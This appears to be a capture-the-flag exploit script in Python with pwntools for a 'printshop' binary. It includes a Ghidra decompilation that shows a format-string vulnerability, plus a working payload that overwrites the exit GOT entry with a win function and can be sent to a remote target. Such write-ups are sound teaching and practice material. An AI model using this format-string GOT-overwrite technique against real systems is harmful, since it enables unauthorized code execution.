#!/usr/bin/env python3


"""
Ghidra decompile


void win(void)

{
  int iVar1;
  FILE *__stream;
  char local_11;
  
  __stream = fopen("flag.txt","r");
  if (__stream == (FILE *)0x0) {
    puts("Flag is missing, contact an organizer.");
    fflush(stdout);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  iVar1 = fgetc(__stream);
  local_11 = (char)iVar1;
  while (local_11 != -1) {
    putchar((int)local_11);
    fflush(stdout);
    iVar1 = fgetc(__stream);
    local_11 = (char)iVar1;
  }
  fclose(__stream);
  return;
}

void main(void)

{
  long in_FS_OFFSET;
  char local_78 [104];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("\nWelcome to the Print Shop!");
  printf("\nWhat would you like to print? >> ");
  fgets(local_78,100,stdin);
  puts("\nThank you for your buisness!\n");
  printf(local_78);
                    /* WARNING: Subroutine does not return */
  exit(0);
}

Attack:  essentially we can write anywhere, no ASLR.

We just need to call the win function, so we can overwrite the 
GOT entry for exit with win and thus only use addresses in the binary
"""

from pwn import *


exe = ELF("./printshop")

BINARY = exe.path
context.terminal = ['tmux', 'splitw', '-v']
# If you don't add this the program crashes
context.arch = 'amd64'

def conn():
    if len(sys.argv) > 1 and sys.argv[1] == 'remote':
        r = remote(sys.argv[2].split(':')[0], int(sys.argv[2].split(':')[1]))
    else:
        r = gdb.debug(BINARY, gdbscript = '''
                       b main
                       c
        ''')

    return r


def main():
    r = conn()

    # pwntools magic
    payload = fmtstr_payload(6, {exe.got['exit'] : exe.sym['win']})

    log.progress("Exploiting")
    r.recvuntil(b'>>')
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    main()
